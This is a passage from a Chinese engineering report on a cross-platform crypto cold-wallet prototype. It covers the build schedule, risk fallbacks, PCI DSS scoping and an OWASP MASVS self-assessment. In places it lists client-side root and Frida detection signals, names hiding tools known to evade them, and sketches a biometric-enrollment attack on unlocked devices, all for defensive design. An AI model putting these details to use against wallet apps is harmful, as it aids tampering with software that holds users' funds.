全项目关键路径为：`T1.1 → T1.2 → T1.3 → T1.4 → T1.5 → T4.1 → T5.2 → G3`。其中 T1.2–T1.4（Android native 闭环）预留 Day1 晚 + Day2 上午共约 1.5 天缓冲——dim07 的逐项评估结论是 D1 当天可完成 Android BIP39/32/44 三件套，缓冲是为 expo local module 的工程摩擦预留的[^180^]。UI（T2.1/T2.2）与安全外壳（T3.3）全部为非关键路径并行任务，任何一项超时直接砍范围（空壳页即可演示），不影响 G1 门槛。

每天 4 个时段：上午 09:00–13:00 / 下午 14:00–18:00 / 晚间 19:00–22:00 / 收尾验证 22:00–23:00。三天主题分别为：**Day1 工程基建 + vault-core Android 闭环（关键路径日）；Day2 iOS 移植 + 三端核心流程 + 安全 MVP 六项落地；Day3 EAS Update 签名 OTA + EAS Build + 演示打磨**。

#### Day 1 — native 闭环日（关键路径）

| 时段 | 任务 ID | 内容 | 产出物 | 验收标准 |
|---|---|---|---|---|
| 上午 | **T1.1** | pnpm workspace 脚手架：`apps/mobile`（SDK ≥57.0.21）+ `packages/vault-core`（`npx create-expo-module@latest --local`）；`ignore-scripts=true`；lockfile 钉版 | 可 `pnpm install` 的 monorepo | `npx expo-doctor` 无红项；Metro monorepo 自动配置生效[^181^] |
| 上午 | **T1.2（关键路径）** | Android Kotlin：BIP39 词表打包 + 校验 + PBKDF2-HMAC-SHA512（`SecretKeyFactory`，缺失机型 fallback 自实现） | `importMnemonic` 返回 handle | BIP39 官方向量前 4 组 instrumentation test 全绿[^180^] |
| 下午 | **T1.3（关键路径）** | Android BIP32（BouncyCastle 新版）+ BIP44 路径解析 → `deriveAddress`（keccak256(pub)[12:]） | `deriveAddress` 返回 `0x...` | BIP32 官方向量全绿；已知助记词派生地址与原仓库记录一致[^180^] |
| 下午 | **T2.1（并行 UI）** | Expo Router 骨架 + NativeWind v4 + Reanimated 4.7 + FlashList v2；onboarding/home/receive/send 四页空壳 | 三端可导航空壳 | `npx expo export --platform web` 成功；Android/Web 路由跳转无 crash |
| 晚间 | **T1.4（关键路径）** | `signDigest`：RFC6979 确定性 ECDSA；`destroy`：mnemonic→seed→各级密钥全链 `fill(0)`；JS 侧 ArrayBuffer 生命周期封装 | 四方法完整闭环 | 签名可被 viem `recoverAddress` 验回同一地址；import/destroy 循环 1000 次无泄漏崩溃 |
| 晚间 | **T2.2（并行 UI）** | viem 2.56 + 两个 polyfill；Zustand + TanStack Query 挂载；只读余额查询 | 地址余额可读 | Web/Android 输入只读地址均显示余额 |
| 收尾 | **G1 门槛** | 双侧验证记录写入 `validation.md` Day1 节 | 当日验证档案 | 见 7.2 |

#### Day 2 — 三端跑通 + 安全 MVP 日

| 时段 | 任务 ID | 内容 | 产出物 | 验收标准 |
|---|---|---|---|---|
| 上午 | **T1.5** | iOS Swift 薄封装（<300 行）：CryptoSwift PBKDF2 + `swift-secp256k1`（SPM），同四方法 API；存储走 expo-secure-store + AES 包裹降级 | iOS 侧 vault-core | iOS dev build 上 BIP39/32 向量全绿、验签通过；13:00 未完即触发风险 b[^180^] |
| 上午 | **T3.1（并行）** | Keystore wrap：AES-GCM 主密钥 + BiometricPrompt CryptoObject 绑定包裹派生密钥；iOS 侧 SecureStore 等价封装 | 密钥材料落盘加密、生物识别门控 | 锁屏后调 signDigest 弹生物识别；错误指纹 3 次 fail-closed |
| 下午 | **T3.2** | 安全 MVP 六项：①native 签名校验 ②bundle 哈希 ③Root 检测 ④越狱检测 ⑤反调试 ⑥Frida 多信号；汇总 risk score 与 signDigest **fail-closed 耦合** | `modules/security-android` 的 `runDetection()`/`assertSigningAllowed()` + vault-core `E_VAULT_SECURITY_GATE` 门控（specs/security-android.md §2.2 / vault-core.md §2.4） | 干净机 risk=0 放行；Magisk 机 signDigest 拒绝（对照录屏）[^182^] |
| 下午 | **T3.3（并行）** | `expo-screen-capture` + `@bam.tech/react-native-app-security` 双 SPKI pinning + 剪贴板策略（私钥路径禁复制） | 安全外壳 | 助记词页截屏为黑图；错误 pin 时 RPC 请求被断 |
| 晚间 | **T4.1** | 端到端：导入助记词 → 余额 → 收款 QR → 构造交易 → native 签名 → 测试网广播；Web 同地址只读 + WalletConnect 占位 | 三端核心流程 | Android 真机发出一笔测试网 tx 且链上可查（tx hash 入档） |
| 晚间 | **T4.2** | Web 端 viem 打包验证（Metro web resolver）；Play Integrity 占位接口 **[S]**（verdict 本地缓存降级） | Web 构建绿 | `expo export --platform web` 成功、Console 无 polyfill 报错 |
| 收尾 | **G2 门槛** | 双侧验证记录 | 当日验证档案 | 见 7.2 |

#### Day 3 — OTA + 构建 + 演示打磨日

| 时段 | 任务 ID | 内容 | 产出物 | 验收标准 |
|---|---|---|---|---|
| 上午 | **T5.1** | EAS 接入：`eas.json` 三 profile + channel；`app.json` 配 `updates.url`、`runtimeVersion: { policy: "fingerprint" }`、`checkAutomatically: ON_LOAD`、`fallbackToCacheTimeout: 0` | EAS 配置 | `eas update:configure` 成功；三 channel 可见[^19^] |
| 上午 | **T5.2** | EAS 代码签名：`codesigning:generate` 生成密钥对；私钥存源码库外；`eas update --private-key-path` 签名发布一条真实更新 | 签名 OTA 链路 | 真机收到签名更新并生效；篡改 manifest 后客户端拒绝加载[^19^] |
| 下午 | **T5.3** | EAS Build：Android preview 包（+ iOS dev build 若环境可用）；确认 Hermes bytecode diffing 生效 | 可安装产物 | `eas build --platform android --profile preview` 成功；APK 装真机全流程通过 |
| 下午 | **T6.1** | 演示打磨：3 幕脚本（①native 闭环签名 ②Root/Frida 拦截对照 ③OTA 签名更新生效）；UI 抛光；已知限制上屏标注 | 演示 runbook + 录屏兜底 | 完整彩排 1 遍 ≤15 分钟无卡点 |
| 晚间 | **T6.2** | 文档收口：`validation.md` 三日全量补齐；Handoff 清单逐条裁定 implement/replan/cancel；面试讲稿 | 交付文档包 | 每个 `[x]` 均有命令+观察结果；Handoff 无静默丢弃项[^183^] |
| 收尾 | **G3 门槛** | 双侧验证 + 终验彩排 | 终验档案 | 见 7.2 |

### 7.2 每日验收门槛

每日 22:00–23:00 的收尾验证是固定动作，遵循原仓库 AGENTS.md 的双侧验证纪律：「Never write 'done' without a command and its observed result」——任何任务标记 `[x]` 必须同时具备**自动侧**（命令原样粘贴 + 观察结果 + 构件绝对路径）与**手工侧**（真机走查 + 屏幕录制，模拟器结果不计入）[^183^]。三道门槛的判定与未达后果：

| 门槛 | 时点 | 判定标准 | 未达后果 |
|---|---|---|---|
| **G1** | Day1 22:00 | `importMnemonic → deriveAddress → signDigest → destroy` 在**真机 Android dev build** 全链路通过，签名可被 viem 验回同一地址。证据：真机录屏 + `npx expo run:android --device` 日志 + 测试向量输出 | 立即触发风险 a 降级，Day2 上午重排；真钱路径硬禁用 |
| **G2** | Day2 22:00 | 三端（Android 全功能 / iOS 全功能或降级 SecureStore / Web 只读）跑通「导入→查余额→签名→广播」核心流程；**安全 MVP 六项真机对照演示**：干净机放行 + Root/Frida 环境拦截两幕 | 若 iOS 卡环境 → 风险 b：演示降级 Android+Web 双端，iOS 列 roadmap |
| **G3** | Day3 22:00 | 可安装 APK 在干净真机演示「导入→签名→广播测试网 tx→Root 机拦截→OTA 签名更新生效」五连击；**EAS 签名 OTA 真实生效（非伪造）**；所有演示宣称与 [P]/[C]/[S] 标注一致 | 触发风险 c/g 降级链；红线：演示前必须开签名，**不演示假签名** |

三道门槛刻意设计为「资产风险递增」序：G1 证明密钥能在 native 里正确活过一轮生命周期；G2 证明它能在被检测门控保护的前提下完成真实链上动作；G3 证明整个交付通道（构建、OTA、验签）可信。任何一道未达，次日的所有计划自动让位于补救，而不是带病推进。

### 7.3 demo 级 vs 真实防护级标注表

面试演示必须诚实区分「3 天内可演示的 demo 级实现」与「真实防护级形态」。全局口径：**除「检测信号与密钥派生 fail-closed 耦合」外，端上检测一律为 [C]**（OWASP MASVS-R 同口径）——Root/Frida/反调试/越狱检测在已 root 设备上均可被耐心攻击者绕过，其价值是攻击成本定价器与遥测信号源，不是门禁[^178^][^182^]。

| 交付物 | 级别 | demo 级（3 天内，面试演示用） | 真实防护级（roadmap） |
|---|---|---|---|
| vault-core 四方法闭环 | **[P]**（demo 范围） | Kotlin/Swift 自研 BIP39/32/44 + ArrayBuffer 边界 + 显式清零 + 官方向量回归 | 共享 C++ 核心（libsecp256k1 经 JSI 直连）+ 常数时间保证 + 第三方密码学审计[^180^] |
| Keystore AES-GCM wrap + 生物识别 | **[P]**（demo 范围） | wrap key + BiometricPrompt 门控可用 | StrongBox/Key Attestation 硬件归属绑定；iOS Secure Enclave 密钥体系[^178^] |
| native 签名校验 | **[P]**（demo 范围） | 签名 SHA-256 常量比对，重打包即拒签（第 4 章详述 v2/v3 签名块自解析与 inode 交叉校验） | 与 Play Integrity verdict + Key Attestation 双轨联动，服务端验 JWT |
| bundle 哈希校验 | **[P]**（demo 范围） | manifest launchAsset hash 校验（EAS 签名自带完整性语义） | CI 两段构建回填流水线 + KMS 私钥托管[^19^] |
| 检测信号与 signDigest 的 fail-closed 耦合 | **[P]** | risk score 超阈值则 native 层不派生、不释放签名材料——干净机/Root 机对照演示 | 检测信号编码进派生盐值（污染式耦合），移除一切「检测→分支」可观察形态[^182^] |
| Frida 检测 | **[C]** | 多信号 demo 级：默认端口 27042、maps 特征串、frida-server 进程名、named pipe | NDK 层检测 + 时间差检测 + inline hook 序言自检扩展 + o-mvll 混淆 + 检测逻辑轮换[^182^] |
| Root/越狱/反调试 | **[C]** | 常规多信号（su 路径、Magisk 包名、TracerPid、IOSSecuritySuite 基线） | 对 Shamiko/SUSFS/Dopamine Hide 级隐藏存在已知漏报；真实级靠 attestation + 服务端风控兜底[^182^] |
| Play Integrity | **[S]** | 占位接口 + verdict 本地缓存降级演示 | 服务端 `decodeIntegrityToken` 验 JWT；STRONG 不硬卡（Android 13+ 补丁窗口误伤）[^178^] |
| TLS pinning | **[P]**（demo 范围） | @bam.tech 双 SPKI pin（native 端自有域名） | pin 轮换预案；Web 端无 pinning 能力属架构降级而非缺口[^178^] |
| FLAG_SECURE / 剪贴板 / 键盘 | **[C]** | expo-screen-capture + 私钥路径禁剪贴板 + inputType 浅加固 | 应用内自定义词格键盘（IME 标志只是 hint 非强制）；native UI 输入使 JS 零接触助记词[^180^] |
| EAS Update 代码签名 | **[P]** | RSA 签名 + 内嵌证书验签真实生效——**不可演示假签名** | 私钥 KMS/离线保管、轮换 runbook、百分比灰度 rollout[^19^] |
| iOS mlock | **[C]** | best-effort（无文档语义保证，真机实测记录） | 依赖 iOS 无 swap + 显式清零 + Keychain 落盘组合达标[^180^] |
| Web 端安全 | **[P]**（架构级） | 只读 + WalletConnect 桥接，不持私钥 | 这是产品级信任分级决策，已是 Web 端最强形态[^178^] |

**读表要点**：[P] 行分两类——「架构级 [P]」（私钥不出 native、Web 不持私钥、OTA 验签拒绝加载）靠系统设计成立，演示当天即真实有效；「demo 范围 [P]」（四方法闭环、Keystore wrap、签名校验）则意味着机制真实生效但未经审计与对抗验证，面试表述必须用「已实现并验证」而非「已安全」。所有 [C] 行的残余风险与 2026 年已知绕过路径已在第 4、6 章逐条列出，演示讲稿只引用结论不复述防护话术。

### 7.4 风险预案矩阵

降级预案的设计原则是**每个风险都有预先写好的触发信号与决策时限**，避免工期压力下临时拍脑袋。七项风险中，a/b/c 是三条会改变演示形态的主风险，d/e 是当日可自愈的工程风险，f/g 是基建兜底：

| # | 风险 | 触发信号 | 降级路径 | 决策时限 |
|---|---|---|---|---|
| a | expo local module 封装不顺（autolink 失败 / ArrayBuffer 传参异常 / Gradle 冲突） | 同类阻塞排查 >2h 无进展；或 Day1 13:00 时 T1.2 向量未绿 | ①首选：vault-core 内部切 `@noble/curves` + `@scure/bip39` **仅作联调占位**（JS 层派生，UI/流程全通），真钱路径硬禁用（`if (!isNativeVault) throw`），界面明示 **[S]** 占位——换回 native 实现时 API 签名不变；②次选：Android only，iOS 整体移 Day3/roadmap | **Day1 13:00**（Insight 4：卡顿超半天即触发）[^179^] |
| b | iOS 环境/证书问题（无 Mac 云构建排队 / 证书配置 / Swift 编译错误） | Day2 13:00 时 iOS dev build 未跑通四方法 | 演示降级 **Android + Web 双端**；iOS 保留 expo-secure-store 降级代码与 roadmap 说明（Secure Enclave 本就 roadmap）。面试话术：信任分级表中 iOS 标注「环境受限，工程路径已验证至编译层」 | **Day2 13:00** |
| c | EAS 代码签名配置卡壳（codesigning 生成 / 证书内嵌 / 档位权限） | Day3 12:00 前签名更新未在真机生效 | 先无签名联调整条 OTA 链路（fingerprint + channel + rollback 演练）；**演示前必须开签名——红线：不演示假签名**。若 Production 档不可用：当场改 `updates.url` 指向 xprem 自建端点演示（签名不受档位限制，客户端改动极小）[^19^] | **Day3 12:00**；彩排前 Day3 16:00 为最后红线 |
| d | Play Integrity 配额/网络问题（频限触发、GMS 不可用、真机无网络） | 调用返回配额错误或超时 | 本地缓存最近 verdict + TTL 降级放行并打风险标记；演示话术用「双轨制」：Play Integrity（有频限、证 app/设备）+ Key Attestation（无频限、证密钥硬件归属、可脱 GMS）防的是不同层[^179^] | 即时（编码时即内置缓存路径） |
| e | Web 端 viem 打包问题（Metro web resolver 解析 crypto/stream 失败） | `npx expo export --platform web` 报模块解析错 | Metro `resolver.resolveRequest` / `extraNodeModules` 预案：web 显式映射 polyfill（`react-native-get-random-values` 先于 viem import、`fastestsmallesttextencoderdecoder`）；仍不通则 Web 降级为静态只读页（手动输入地址查询） | **Day2 21:00**（T4.2 时段内） |
| f | pnpm 隔离安装解析异常（老库 autolinking 误扫） | `pnpm install` 后 prebuild/autolink 报错 | `.npmrc` 回退 `nodeLinker: hoisted` + `autolinking.exclude` + Metro `resolveRequest` 双层屏蔽；>2h 未解则降级单 Expo 工程 + `src/core` 目录（Metro 自动配置保证迁移成本低）[^181^] | **Day1 11:00** |
| g | EAS Build 云排队超时 | Day3 15:00 无构建产物 | 本地 `npx expo run:android --variant release` 出 APK 演示；EAS Build 状态截图留证 | Day3 15:00 |

三条结构性说明。其一，风险 a 的降级链刻意保持 **API 签名不变**——noble/curves 占位实现与 native 实现暴露同一组四方法接口，换回真实现时 UI 与流程代码零改动，降级不会变成返工。其二，风险 c 的红线（不演示假签名）与第 5 章结论互锁：EAS 代码签名的 Production 档 $199/月是冷钱包 OTA 的入场费，若面试现场无法开签名，正确动作是承认并展示 xprem 自建等价路径，而不是关掉验签演一遍「看起来成功」的更新——后者直接违反诚实标注纪律[^19^][^178^]。其三，所有降级都在 Handoff 清单登记为「刻意递延项」，次日规划轮逐条裁定 implement/replan/cancel，不允许静默丢弃[^183^]。

### 7.5 工期可行性论证

「3 天做完一个三端冷钱包原型」听起来激进，拆解后可行性建立在四个事实上。

**第一，UI 层全是成熟件，不存在验证风险。** Expo Router、NativeWind v4、Reanimated 4.7、FlashList v2、TanStack Query、Zustand、viem 均为前序章节逐项核实过的定案选型（含版本锁定与 CVE 排除），UI 侧的工作量是纯堆量：4 页路由骨架 + 状态挂载 + 一个只读查询。这类工作由 AI 编码并行压缩的效率最高——模式成熟、样例充足、验收机械（跑起来、不 crash、能跳转），T2.1/T2.2 合计约 1 个晚间时段即可产出可演示空壳。这是「AI 辅助」在本计划中真正发挥作用的位置：**压缩成熟模式的实现时间，而不是加速高风险的密码学实现**。

**第二，native 闭环的范围被刻意收敛到 4 个方法。** vault-core 的接口面只有 `importMnemonic(ArrayBuffer)→handle` / `deriveAddress(handle, path)` / `signDigest(handle, path, digest32)→sig` / `destroy(handle)`，JS↔native 只传 ArrayBuffer 与 opaque handle——没有通用密钥管理框架、没有多币种、没有账户体系。dim07 的逐项评估（含 PBKDF2 fallback、BIP39/32 官方向量回归清单、iOS 薄封装 <300 行）给出的结论是 Android 三件套 D1 可完成，且每一步验收都用官方向量与 viem 验签这类**无需人工判断的机械判据**，不存在「做完了但不确定对不对」的灰色地带[^180^]。范围收敛换来的代价已在 roadmap 明码标价：共享 C++ 核心、常数时间保证、第三方密码学审计全部不在 3 天内（7.3 表）。

**第三，安全 MVP 六项的 4.5–6 人日缺口，靠「砍深度不砍叙事」消化。** 第 4 章的逐项估算如实说明：六项合计约 4.5–6 人日，超出 3 天原型窗口[^182^]。取舍逻辑分三层——①**不砍的是叙事骨架**：fail-closed 耦合（唯一 [P] 级控制）+ 干净机/Root 机对照演示必须完整，这是面试展示安全专业度的核心一幕；②**砍的是向量深度**：Root 检测只用 MVP 子集（mounts/mountinfo 交叉 + su 路径 + props + SVC errno 抽样，约 1–1.5 天），对 SUSFS 级隐藏的已知漏报如实标注；Frida 检测只做基础四信号（0.5 天），inline hook 序言字节自检（0.5–1 天）允许溢出到 Day 4 或首个迭代；③**整体砍入 roadmap 的是重资产项**：NDK C++ 共享核心、Secure Enclave 通用密钥体系、StrongBox/Key Attestation 硬件绑定、native 自定义词格键盘、Play Integrity 服务端验签、o-mvll 混淆、SQLCipher——这些每一项单独都要 1 天以上且 3 天内无法完成真机验证，按排期纪律不占窗口[^177^]。诚实的说法是：3 天交付的不是「完成品」，而是「骨架正确、降级诚实、roadmap 清晰的验证品」。

**第四，缓冲与降级链是排期的一部分，不是乐观假设。** 关键路径段（T1.2–T1.4）自带约 1.5 天缓冲；七条风险预案全部预先写好触发信号与决策时限（7.4），其中五条带「换实现不换接口」式的无损降级路径。3 天计划真正的失败模式不是某个任务超时——那有降级兜底——而是超时后舍不得砍范围。本计划用每日 G 门槛把「砍」变成了预设动作：G1 未达则 Day2 上午整个重排，而不是在 Day2 晚上发现全线崩坏。配合每日 22:00–23:00 的双侧验证收尾（命令 + 观察结果 + 真机录屏三件套）[^183^]，排期状态始终可观测，这是单人 + AI 编制下比「多估时间」更可靠的保险。

---

## 第8章 合规边界与标准对标

> 本章回答两个边界问题：NexVault 落不落 PCI DSS？按 OWASP MASVS 自评到什么级别、差距在哪？与第 6 章 §6.6 合规注记（中国大陆 geo-fence、海外辖区差异、平台验证时间表）互补不重复：§6.6 讲「卖给谁、在哪分发」，本章讲「对标哪个标准、边界画在哪」。本章为工程对标分析，**不构成法律意见**；[P]/[C]/[S] 标注纪律沿用全书约定。

### 8.1 PCI-DSS 适用范围论证

**版本基线**：截至 2026-10-14，PCI DSS v4.0.1 为现行唯一版本（2024-06 发布；v4.0 已于 2024-12-31 退役，v3.2.1 已于 2024-03-31 退役；全部 51 项 future-dated 要求自 2025-03-31 起强制生效）[^184^]。

**官方范围定义**。PCI DSS v4.0.1 §4 规定，标准适用于 CDE（cardholder data environment）——由「存储、处理或传输持卡人数据（CHD）和/或敏感认证数据（SAD）的系统组件、人员与流程」，以及「本身不接触 CHD/SAD 但与上述组件存在无限制连接（unrestricted connectivity）的系统组件」共同构成[^185^]。三个关键术语的官方定义：CHD 以完整 PAN 为判定锚点——"the primary account number is the defining factor for cardholder data"，持卡人姓名、有效期、服务代码只有与 PAN 共同出现才需按 PCI DSS 保护；SAD 指全磁道数据、CAV2/CVC2/CVV2/CID 与 PIN/PIN block，且授权后禁止存储（即使加密，且即使环境中无 PAN）[^186^][^187^]。

**「无 PAN 即无 CDE」论证链**（四环，环环有官方引文支撑）：

1. **范围触发条件是「账户数据」，不是「资金」或「支付意图」**。PCI DSS 只适用于存储/处理/传输 CHD（锚定完整 PAN）或 SAD 的实体与系统（§4 Scope 与 Applicability Information）[^185^][^187^]。
2. **自托管冷钱包的数据流中不存在任何账户数据**。私钥、助记词、链上地址、交易哈希均非 PAN，也不与任何 PAN 共同出现；链上转账不经 Visa/Mastercard 等卡组织网络，钱包方不扮演商户、收单、发卡或处理商角色。
3. **因此不存在 CDE**。按 §4 定义，没有任何组件存储/处理/传输 CHD/SAD，就没有 CDE；没有 CDE，「connected-to / security-impacting」的二层扩散无从依附。
4. **旁证**：加密支付网关行业公认 crypto 侧完全在 PCI 范围之外[^188^]。

措辞纪律：结论用「**out of scope（不落入范围）**」而非「exempt（豁免）」——PCI 没有豁免机制，范围完全由数据流决定；且范围判定须至少每 12 个月复核一次（v4.0.1 Req. 12.5.2 的 scope confirmation 精神），业务一旦触碰账户数据即重新定界[^184^][^203^]。

**PCI 出范围 ≠ 无标准可依**。钱包适用的周边框架：OWASP MASVS（移动 App 本体，本章 8.3/8.4）、OWASP ASVS（后端 API，MASVS 官方明确不覆盖服务端）、SOC 2 Type II 与 ISO/IEC 27001（公司级）、各辖区 VASP/CASP 监管（欧盟 MiCA、美国 FinCEN MSB/州 MTL、FATF Travel Rule——非托管钱包在多数辖区不构成 VASP，辖区差异提示见 §6.6）、GDPR 及各辖区隐私法（对应 MASVS-PRIVACY）[^203^]。

### 8.2 扩展场景分析：加密卡发卡与法币 on-ramp 的 PCI 边界

「出范围」结论只在当前业务形态下成立。若未来扩展两类业务，范围判定立刻改变：

| 扩展场景 | 落入 PCI 范围的组件 | 隔离/缩范围定案 |
|---|---|---|
| 加密卡发卡（crypto-linked card） | 任何展示完整 PAN 的 UI/接口、PAN 传输通道、CVC2 处理（SAD，授权后禁存）、3DS/ACS 流程 | **不自建发卡**：委托持牌 issuer-processor（Marqeta / Stripe Issuing 模式），其持 PCI DSS Level 1 认证并托管全部卡片数据——Marqeta 官方文档明确「PAN 不存储在其服务器，仅存 token」[^189^][^190^]；钱包 App 仅展示脱敏卡号（BIN+last4）与 network token，卡面展示走 issuer-processor 托管 SDK/页面 |
| 法币 on-ramp（入金通道） | 若用户在钱包自控页面直接输入卡号，钱包 web/app 组件进范围——Direct Post / 自托管表单模式通常丧失 SAQ A/A-EP 资格、落入 SAQ D[^191^] | **SAQ A 级隔离**：full redirect 或 provider-hosted iframe 至 PCI 合规 on-ramp（MoonPay 宣称 PCI DSS 4.0.1 认证、Paybis 宣称 Level 1）[^192^]，全部账户数据功能外包给 PCI 合规 TPSP，钱包系统不存储/处理/传输任何账户数据[^193^] |

**架构隔离方案定案：钱包核心永不触碰卡数据。** 五条约束（可直接写入 spec）：

1. 钱包核心（密钥管理、签名、链上广播）**永不接收、路由、展示、记录完整 PAN 或 SAD**——产品层硬性约束：卡相关 UI 仅渲染 issuer-processor 托管的 iframe/SDK 视图或脱敏字段（BIN+last4）。
2. 发卡场景：PAN/CVC2/3DS 全部驻留 issuer-processor（PCI DSS Level 1）侧，钱包仅持 network token / 卡引用 ID。
3. on-ramp 场景：**优先 full redirect 而非 iframe**。PCI SSC FAQ 1588（2025-02-28 公告）对 iframe 嵌入式 SAQ A 附加了「商户须确认其站点不易受脚本攻击」的资格条款，而 full redirect 与完全外包不适用该条款——选 redirect 可直接规避这一确认负担[^194^]。
4. 网络层：钱包基础设施与任何（假设性）卡数据组件之间无可达路径，满足 PCI SSC Scoping Guidance 的 out-of-scope 五条判定标准（不存/不传/不处理 CHD/SAD、不在同一网段、无法连接或访问 CDE、无法经由在范围系统影响 CDE 安全控制）；即便未来引入卡业务，也以独立主体/独立网段/独立 CI/CD 隔离，并按 Req. 11.4.5 以年度渗透测试验证分段有效性[^195^][^196^][^197^]。
5. 残留义务上限：在上述约束下，钱包方的 PCI 义务上限为 **SAQ A**（电商 redirect/iframe 通道的最轻问卷）。

**CDE 与钱包核心的隔离边界（文字描述）**：边界一侧是钱包核心域——vault-core native 闭环、Keystore/Keychain 硬件包裹、设备证明双轨、广播中继，其处理的数据全部为非账户数据；另一侧是（假设性）卡业务域——issuer-processor 托管页面/SDK 与 on-ramp 托管收银台，PAN/SAD 的存储、处理、传输全部发生在持牌 TPSP 自己的 CDE 内。两侧之间唯一的数据交换是脱敏字段（BIN+last4、token、交易状态）与一次浏览器级跳转；无共享数据库、无共享网段、无共享部署管线。这一「tokenization（缩数据面）+ segmentation（缩 CDE 边界）」组合正是 PCI SSC 认可的两大缩范围手段[^198^]。

### 8.3 OWASP MASVS 自评：术语与目标级别

**版本与术语**。现行版本为 MASVS v2.1.0（2024-01-18 发布，8 个控制组、24 条控制，2026 年仍现行）[^199^]。术语必须精确：自 MASVS v2.0.0（2023-04 重构）起，L1/L2/R 不再是标准内的 verification levels，已改称 **MAS Testing Profiles**（MAS-L1/L2/R + MAS-P）[^200^]；下文按行业惯用将「L1/L2/R（现称 Testing Profiles）」并列使用。

**级别定义**（官方攻击者模型）[^201^]：

- **MAS-L1（Essential Security）**：基本安全基线，对手模型是「设备上安装的其他应用」，官方推荐为所有移动 App 的基线。
- **MAS-L2（Advanced Security）**：深度防御，假设设备已 root/越狱、操作系统安全控制不可信、攻击者可能有物理接触；官方推荐语为「处理高风险敏感数据且含敏感功能的 App」[^202^]。
- **MAS-R（Resilient Security）**：抗逆向韧性，对手模型是「设备用户本人（逆向者）」；官方明确其**用于增强而非替代 L1/L2、不能独立使用**，且「无法保证 100% 有效」——与本书第 4/6 章对端上检测层的 [C] 级定位同口径[^202^]。

**目标级别定为 L2+R 的依据（如实措辞）**。OWASP 官方没有「加密货币钱包必须 L2+R」的逐字声明，本报告的目标级别是基于官方示例矩阵的**推论**：MAS Testing Profiles 官方示例矩阵将「money transfers（转账）、应用内购买」类敏感功能与 Banking/Insurance 示例 App 归入 **MAS L2+P+R**，并将 "crypto key encrypting user data" 列为中高风险敏感数据示例[^201^]。自托管钱包 = 持有用户加密私钥（高敏感数据）+ 转账签名（敏感功能），落位 MAS-L2+R 是该矩阵的直接推论，也是移动安全测试行业对 fintech/banking 类应用的一致实践；P（隐私基线）一并纳入自评。另注两条口径：OWASP 不提供 MASVS 认证，任何「MASVS certified」宣称均非官方背书；自动化工具不能单独完成 MASVS 验证[^199^][^203^]。

### 8.4 MASVS 逐组自评表

按 MASVS v2.1.0 的 8 个控制组逐组自评。级别归属依据 OWASP 官方 Profiles 页面的 MASWE→控制映射（L2 = L1 ∪ L2 增量；R = RESILIENCE 全组；P = PRIVACY 全组）[^200^][^203^]。

| 控制组 | 目标级别 | NexVault 当前达成 | 依据（报告章节 / spec） | 缺口与 roadmap |
|---|---|---|---|---|
| **STORAGE** 设备上敏感数据安全存储 | L2 | **L2 基本达成**（L1 项达成，L2 私有存储加密待证） | 密钥存平台安全 Keystore/Keychain 硬件包裹 [P]（§3.2/3.3、specs/vault-core.md）；敏感数据不入日志/备份、包内无硬编码（§5.7 门禁 + release 扫描） | 私有存储内数据加密（MASWE-0001，SQLCipher/文件保护类）在 roadmap（§7.5） |
| **CRYPTO** 密码学与密钥管理 | L2 | **L2-**（强密码学/KDF/密钥访问限制达成） | native 闭环签名 + RFC6979 + PBKDF2-HMAC-SHA512（§3.5、§7.1）；密钥访问由 per-use 生物识别限制 [P]（§3.2） | 强制设备安全锁（无锁屏设备拒绝/降权，MASWE-0017）待实现；私钥不轮换——需以助记词/密钥生命周期设计说明论证该条适用性 |
| **AUTH** 认证与授权 | L2 | **L2-**（防绕过与 step-up 达成；**生物特征变更密钥失效为已知缺口**） | 签名前生物识别确认 + BiometricPrompt CryptoObject 绑定 [P]（§3.2、§7.1 T3.1） | **新增生物特征后密钥失效**（MASWE-0022，Keystore `setInvalidatedByBiometricEnrollment` / Keychain ACL）未实现未验证——钱包类最常见 L2 缺口，roadmap 第一优先级[^203^]；敏感交易禁止回退非生物凭据、会话终止后敏感数据不可达待确认 |
| **NETWORK** 安全通信 | L2 | **L2 达成** | 全流量 TLS + 双 SPKI identity pinning、fail-closed [P]（§4.5、§6.4） | pin 轮换/备份 pin 预案；第三方 RPC 节点是否在 pinning 范围需例外说明 |
| **PLATFORM** 平台与 IPC 交互 | L2 | **L1+**（deep link/WebView 面达成，UI 防护待证） | WalletConnect/deep link 校验（§3.4）；不内嵌 WebView 时 PLATFORM-2 记 N/A | 后台截屏/录屏遮蔽（已有 expo-screen-capture [P 未 root]/[C root]，§7.1 T3.3）、overlay 攻击防护、通知/UI 敏感数据暴露——PLATFORM-3 全组（L2）待逐项确认 |
| **CODE** 安全最佳实践 | L2 | **L1+** | target 最新平台版本；依赖 CVE 门禁 + lockfile 钉版 + min-release-age（§5.7）；不可信输入校验 | 强制更新机制（CODE-2，MASWE-0043）待实现；编译器安全特性（Hermes/原生库编译加固证据，MASWE-0045）待补 |
| **RESILIENCE** 抗逆向与抗篡改 | R | **主要缺口：R 部分达成** | 平台完整性：Play Integrity + App Attest + Key Attestation 双轨 [C]（§3.8）；签名校验/Root/Frida/反调试多信号检测全部 [C]（§4.2、§6.4） | 反篡改（RESILIENCE-2）、抗静态分析（RESILIENCE-3：o-mvll 混淆在 roadmap，[S]→[C]）、抗动态分析（RESILIENCE-4：反注入）未落地；官方口径：R 组缺失不构成漏洞、不能替代 L1/L2[^202^] |
| **PRIVACY** 隐私基线 | P | **P 基本达成** | 自托管天然优势：无私钥上传、无账户体系（§1.4）；设备级信号采集按 GDPR 口径披露（§6.6） | 核对分析 SDK 与 crash 上报的数据面、RPC 节点 IP 泄露；商店 data safety 声明与隐私政策一致性 |

**分析**。八组中 NETWORK 是唯一完全达成目标级别的一组，凭的是 §4.5 的 fail-closed 双 SPKI pinning 这一 [P] 级机制——它再次印证第 6 章的规律：[P] 级达成全部来自「攻击者无法制造的物理事实」，而非检测代码。STORAGE/CRYPTO 紧随其后，缺口集中在「私有存储加密」「强制设备锁」这类工程项而非架构项，补齐成本以人日计。AUTH 组的已知缺口值得单独强调：若未设置生物特征变更即密钥失效，攻击者拿到已解锁设备后登记自己的指纹，即可通过生物识别门控调起已包裹的密钥——这条 MASWE-0022 是钱包类应用最常见的 L2 失守点，修复只需一行 Keystore 参数，但必须作为 roadmap 显式立项而非顺带修复。RESILIENCE 组是账面差距最大的一组，但按第 6 章的诚实口径，其多数机制本就是 [C] 级「攻击成本定价器」，官方亦明示 R 组缺失不构成漏洞、不能独立使用——因此真实优先级排序应是 **AUTH 生物特征失效 > STORAGE 私有存储加密 > PLATFORM-3 UI 防护 > RESILIENCE 混淆/反注入**，而非按差距面积排序。整体结论：NexVault 当前处于 **MAS-L1 全达 + MAS-L2 大部分达成** 的位置，距 L2+R 